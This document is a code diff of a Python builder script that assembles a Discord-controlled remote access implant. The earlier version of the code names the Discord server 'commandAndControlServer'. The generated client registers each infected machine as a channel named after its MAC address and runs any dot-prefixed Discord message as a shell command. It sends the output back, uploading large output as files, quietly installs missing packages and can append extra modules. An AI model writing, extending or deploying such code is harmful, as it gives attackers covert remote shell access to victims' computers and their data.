@@ -3,57 +3,66 @@ import os
 import sys
 import importlib.util
 from datetime import datetime
+import subprocess
+import re
 
-def get_current_date_str():
-    """Return the current date as a string formatted YYYY_MM_DD."""
-    return datetime.now().strftime("%Y_%m_%d")
+# --- Setup output and settings paths ---
+date_str = datetime.now().strftime("%Y_%m_%d")
+script_dir = os.path.dirname(__file__)
+output_dir = os.path.join(script_dir, 'OUTPUT', date_str)
+os.makedirs(output_dir, exist_ok=True)
+client_script_path = os.path.join(output_dir, 'client.py')
+settings_path = os.path.join(script_dir, '..', '..', 'settings', 'settings.json')
 
-def create_output_directory(date_str):
-    """Ensure the OUTPUT directory for the given date exists and return its path."""
-    output_dir = os.path.join(os.path.dirname(__file__), 'OUTPUT', date_str)
-    os.makedirs(output_dir, exist_ok=True)
-    return output_dir
+print(f"[?] Settings path: {settings_path}")
+print(f"[?] Client path: {client_script_path}")
 
-def get_client_script_path(output_dir):
-    """Return the full path to the client.py file in the output directory."""
-    return os.path.join(output_dir, 'client.py')
+if not os.path.exists(settings_path):
+    print(f"[-] Settings file not found at {settings_path}")
+    sys.exit(1)
 
-def get_settings_file_path():
-    """Return the full path to the settings.json file."""
-    return os.path.join(os.path.dirname(__file__), '..', '..', 'settings', 'settings.json')
+# --- Load settings from JSON ---
+print(f"[?] Reading settings from {settings_path}")
+try:
+    with open(settings_path, "r") as file:
+        settings = json.load(file)
+except json.JSONDecodeError as error:
+    print(f"[-] Error parsing JSON: {error}")
+    sys.exit(1)
+print(f"[+] Reading settings from {settings_path} successfully")
 
-def verify_file_exists(file_path, error_message):
-    """Exit the program if the specified file does not exist."""
-    if not os.path.exists(file_path):
-        print(error_message)
-        sys.exit(1)
+# --- Prepare the initial client script ---
+initial_script = """
 
-def load_settings(settings_path):
-    """Load and return settings from the JSON file."""
-    print(f"[?] Reading settings from {settings_path}")
-    try:
-        with open(settings_path, "r") as file:
-            settings = json.load(file)
-    except json.JSONDecodeError as error:
-        print(f"[-] Error parsing JSON: {error}")
-        sys.exit(1)
-    print(f"[+] Reading settings from {settings_path} successfully")
-    return settings
-
-def get_initial_client_script():
-    """Return the initial part of the client.py script."""
-    return """
 import os
-import discord
 import sys
-from settings import guildid, bottoken
+import subprocess
+import re
 from uuid import getnode
 
+def installModuleIfMissing(module_name):
+    try:
+        __import__(module_name)
+        print(f"[OK] {module_name} is already installed")
+    except ImportError:
+        print(f"[MISSING] {module_name} is missing, installing...")
+        subprocess.check_call([sys.executable, "-m", "pip", "install", module_name])
+        print(f"[OK] {module_name} has been installed")
+
+# Try to import discord, install if missing
+installModuleIfMissing("discord")
+import discord
+
+# Initialize global variables
 intents = discord.Intents.all()
 intents.members = True
 client = discord.Client(intents=intents)
-global mac_address
 mac_address = str(getnode())
+sessions = {}
+
+class UserSession:
+    def __init__(self):
+        self.cwd = os.getcwd()
 
 async def find_channel_by_name(guild, channel_name):
     for channel in guild.channels:
@@ -63,100 +72,157 @@ async def find_channel_by_name(guild, channel_name):
 
 @client.event
 async def on_ready():
-    commandAndControlServer = client.get_guild(int(guildid))
-    channel = await find_channel_by_name(commandAndControlServer, mac_address)
+    guild = client.get_guild(int(guildid))
+    channel = await find_channel_by_name(guild, mac_address)
     if channel:
         await channel.send("Connection reestablished")
     else:
-        channel = await commandAndControlServer.create_text_channel(mac_address)
-        e = await channel.send("New Connection established")
-        await e.pin()
-        await channel.send("hello world")
+        channel = await guild.create_text_channel(mac_address)
+        await channel.send("New Connection established")
 
 @client.event
 async def on_message(message):
     if message.author == client.user:
-        return
+        return    
+    if message.content.startswith('.'):
+        # Get or create a session for this user
+        user_id = message.author.id
+        if user_id not in sessions:
+            sessions[user_id] = UserSession()
+        
+        session = sessions[user_id]
+        command = message.content[1:].strip()  # Remove the dot prefix and whitespace
+        
+        # Special handling for cd command
+        if command.startswith('cd ') or command == 'cd':
+            try:
+                if command == 'cd':  # Just 'cd' goes to home directory
+                    new_dir = os.path.expanduser("~")
+                else:
+                    # Extract the target directory
+                    target_dir = command[3:].strip()
+                    # Handle relative or absolute paths
+                    if os.path.isabs(target_dir):
+                        new_dir = target_dir
+                    else:
+                        new_dir = os.path.join(session.cwd, target_dir)
+                
+                # Try to change directory
+                if os.path.exists(new_dir) and os.path.isdir(new_dir):
+                    session.cwd = os.path.abspath(new_dir)
+                    output = f"Changed directory to: {session.cwd}"
+                    dir_contents = os.listdir(session.cwd)
+                    dir_listing = "\\n".join(dir_contents) if dir_contents else "Directory is empty"
+                    output += f"\\n\\nDirectory contents:\\n{dir_listing}"
+                else:
+                    output = f"Error: Directory '{new_dir}' does not exist"
+                
+                embed = discord.Embed(
+                    title="Directory Change",
+                    description=f"```{output}```",
+                    color=0xfafafa
+                )
+                await message.reply(embed=embed)
+            except Exception as e:
+                error_embed = discord.Embed(
+                    title="Error",
+                    description=f"```{str(e)}```",
+                    color=0xff0000
+                )
+                await message.reply(embed=error_embed)
+        else:
+            try:
+                process = subprocess.Popen(
+                    command,
+                    shell=True,
+                    stdout=subprocess.PIPE,
+                    stderr=subprocess.PIPE,
+                    text=True,
+                    cwd=session.cwd
+                )
+                stdout, stderr = process.communicate()                
+                output = stdout if stdout else stderr
+                if not output:
+                    output = "Command executed successfully with no output"
+                
+                if len(output) > 4000:  # Using 4000 to be safe
+                    temp_file = f"output_{message.id}.txt"
+                    with open(temp_file, 'w', encoding='utf-8') as f:
+                        f.write(output)
+                    
+                    await message.reply(
+                        content="Output too large for embed. Sending as file:",
+                        file=discord.File(temp_file, filename=f"{command.replace(' ', '_')}_output.txt")
+                    )
+                    
+                    try:
+                        os.remove(temp_file)
+                    except:
+                        pass
+                else:
+                    embed = discord.Embed(
+                        title=f"Command: {command} (in {session.cwd})",
+                        description=f"```{output}```",
+                        color=0xfafafa
+                    )
+                    embed.add_field(name="Exit Code", value=str(process.returncode))
+                    await message.reply(embed=embed)
+            except Exception as e:
+                error_embed = discord.Embed(
+                    title="Error",
+                    description=f"```{str(e)}```",
+                    color=0xff0000
+                )
+                await message.reply(embed=error_embed)
 """
 
-def load_module_code(module_name, module_file_path):
-    """Load and return the code snippet from a module if available."""
+# --- Process additional component modules (if any) ---
+components_dir = os.path.join(script_dir, 'components', 'done')
+print(f"[?] Searching for components in {components_dir}")
+
+modules_config = settings.get("Modules", settings.get("modules", {}))
+if modules_config:
+    print(f"[i] Found modules in settings: {', '.join(modules_config.keys())}")
+else:
+    print("[i] No modules configuration found in settings")
+
+modules_code = ""
+for module_name, is_enabled in modules_config.items():
+    if not is_enabled:
+        print(f"[?] Module {module_name} is disabled in settings; skipping.")
+        continue
+    module_file_name = f"{module_name.lower()}.py"
+    module_file_path = os.path.join(components_dir, module_file_name)
+    if not os.path.exists(module_file_path):
+        print(f"[-] Module {module_name} is enabled in settings but file not found at {module_file_path}")
+        continue
     try:
         spec = importlib.util.spec_from_file_location(module_name, module_file_path)
         module = importlib.util.module_from_spec(spec)
         spec.loader.exec_module(module)
         if hasattr(module, "get_code"):
             print(f"[+] Adding code from {module_name}")
-            return module.get_code()
+            modules_code += module.get_code()
         else:
             print(f"[-] Module {module_name} does not have a get_code function")
     except Exception as error:
         print(f"[-] Error loading {module_name} from {module_file_path}: {error}")
-    return ""
 
-def process_modules(modules_config, components_dir):
-    """Iterate through each module in settings and append its code if enabled."""
-    combined_code = ""
-    for module_name, is_enabled in modules_config.items():
-        if not is_enabled:
-            print(f"[?] Module {module_name} is disabled in settings; skipping.")
-            continue
-
-        module_file_name = f"{module_name.lower()}.py"
-        module_file_path = os.path.join(components_dir, module_file_name)
-        if not os.path.exists(module_file_path):
-            print(f"[-] Module {module_name} is enabled in settings but file not found at {module_file_path}")
-            continue
-
-        combined_code += load_module_code(module_name, module_file_path)
-    return combined_code
-
-def finalize_client_script(existing_script):
-    """Append the final part of the client.py script."""
-    additional_code = """
-# Add more commands and functionality as needed...
-
+# --- Finalize the client script ---
+bot_token = settings.get("token", "")
+guild_id = settings.get("guildID", "")
+step1 = f"""# Bot configuration
+guildid = "{guild_id}"
+bottoken = "{bot_token}"
+"""
+step3 = """
+# Start the bot
 client.run(bottoken)
 """
-    return existing_script + additional_code
+final_script = step1 + initial_script + modules_code + step3
 
-def write_client_script(file_path, content):
-    """Write the generated client script to a file."""
-    with open(file_path, "w") as file:
-        file.write(content)
-    print("[+] Writing client.py successful")
-    print(f"[+] client.py has been generated at {file_path}")
-
-def main():
-    # Set up paths and directories
-    current_date_str = get_current_date_str()
-    output_dir = create_output_directory(current_date_str)
-    client_script_path = get_client_script_path(output_dir)
-    settings_path = get_settings_file_path()
-
-    print(f"[?] Settings path: {settings_path}")
-    print(f"[?] Client path: {client_script_path}")
-
-    verify_file_exists(settings_path, f"[-] Settings file not found at {settings_path}")
-
-    # Load settings from file
-    settings = load_settings(settings_path)
-
-    # Start building the client.py content
-    client_script_content = get_initial_client_script()
-
-    # Process additional component modules
-    components_dir = os.path.join(os.path.dirname(__file__), 'components')
-    print(f"[?] Searching for components in {components_dir}")
-    modules_config = settings.get("Modules", {})
-    client_script_content += process_modules(modules_config, components_dir)
-
-    print("[.] Building client.py")
-    client_script_content = finalize_client_script(client_script_content)
-    print("[+] Building client.py successful")
-
-    # Write the generated client script to file
-    write_client_script(client_script_path, client_script_content)
-
-if __name__ == "__main__":
-    main()
+# --- Write the client script to file ---
+with open(client_script_path, "w") as file:
+    file.write(final_script)
+print("[+] Writing client.py successful")
+print(f"[+] client.py has been generated at {client_script_path}")
